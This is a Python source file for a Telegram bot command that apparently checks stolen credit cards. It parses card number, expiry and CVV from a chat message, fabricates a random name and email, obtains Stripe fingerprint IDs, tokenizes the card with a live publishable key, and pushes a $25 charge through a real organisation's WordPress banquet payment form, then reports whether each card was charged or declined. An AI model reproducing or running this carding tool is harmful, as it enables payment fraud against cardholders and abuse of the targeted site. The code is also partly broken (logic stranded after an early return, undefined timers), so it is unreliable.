from database.db import *
from utils.bot_config import *

@bot.message_handler(commands=['st'])
def st(message: types.Message):

    # Random DATA
    letters = string.ascii_lowercase
    First = ''.join(random.choice(letters) for _ in range(6))
    Last = ''.join(random.choice(letters) for _ in range(6))
    PWD = ''.join(random.choice(letters) for _ in range(10))
    Name = f'{First}+{Last}'
    Email = f'{First}.{Last}@gmail.com'

    message.answer_chat_action('typing')
    ID = message.from_user.id
    FIRST = message.from_user.first_name
    if message.reply_to_message:
        cc = message.reply_to_message.text
    else:
        cc = message.text[len('/st '):]

    if len(cc) == 0:
        return message.reply("<b>No Card to chk</b>")

        x = re.findall(r'\d+', cc)
        ccn = x[0]
        mm = x[1]
        yy = x[2]
        cvv = x[3]
        if mm.startswith('2'):
            mm, yy = yy, mm
        if len(mm) >= 3:
            mm, yy, cvv = yy, cvv, mm
        if len(ccn) < 15 or len(ccn) > 16:
            return message.reply('<b>Failed to parse Card</b>\n'
                                       '<b>Reason: Invalid Format!</b>')   
       # get guid muid sid
        headers = {
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
            "accept": "application/json, text/plain, */*",
            "content-type": "application/x-www-form-urlencoded"
            }
        s = session.post('https://m.stripe.com/6', headers=headers)
        r = s.json()
        Guid = r['guid']
        Muid = r['muid']
        Sid = r['sid']

        postdata = {
            "guid": Guid,
            "muid": Muid,
            "sid": Sid,
            "key": "pk_live_iBIpeqzKOOx2Y8PFCRBfyMU000Q7xVG4Sn",
            "card[name]": Name,
            "card[number]": ccn,
            "card[exp_month]": mm,
            "card[exp_year]": yy,
            "card[cvc]": cvv
        }

        HEADER = {
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
            "origin": "https://js.stripe.com",
            "referer": "https://js.stripe.com/",
            "accept-language": "en-US,en;q=0.9"
        }

        pr = session.post('https://api.stripe.com/v1/tokens',
                          data=postdata, headers=HEADER)
        Id = pr.json()['id']

        # hmm
        load = {
            "action": "wp_full_stripe_payment_charge",
            "formName": "BanquetPayment",
            "fullstripe_name": Name,
            "fullstripe_email": Email,
            "fullstripe_custom_amount": "25.0",
            "fullstripe_amount_index": 0,
            "stripeToken": Id
        }

        header = {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
            "origin": "https://archiro.org",
            "referer": "https://archiro.org/banquet/",
            "accept-language": "en-US,en;q=0.9"
        }

        rx = session.post('https://archiro.org/wp-admin/admin-ajax.php',
                          data=load, headers=header)
        msg = rx.json()['msg']

        if 'true' in rx.text:
            return message.reply(f'''
✅<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ #CHARGED 25$
<b>MSG</b>➟ {msg}
<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
<b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>OWNER</b>: {is_owner(ID)}
<b>BOT</b>: @{BOT_USERNAME}''')

        if 'security code' in rx.text:
            return message.reply(f'''
✅<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ #CCN
<b>MSG</b>➟ {msg}
<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
<b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>OWNER</b>: {is_owner(ID)}
<b>BOT</b>: @{BOT_USERNAME}''')

        if 'false' in rx.text:
            return message.reply(f'''
❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ #Declined
<b>MSG</b>➟ {msg}
<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
<b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>OWNER</b>: {is_owner(ID)}
<b>BOT</b>: @{BOT_USERNAME}''')

        message.reply(f'''
❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ DEAD
<b>MSG</b>➟ {rx.text}
<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
<b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>OWNER</b>: {is_owner(ID)}
<b>BOT</b>: @{BOT_USERNAME}''')
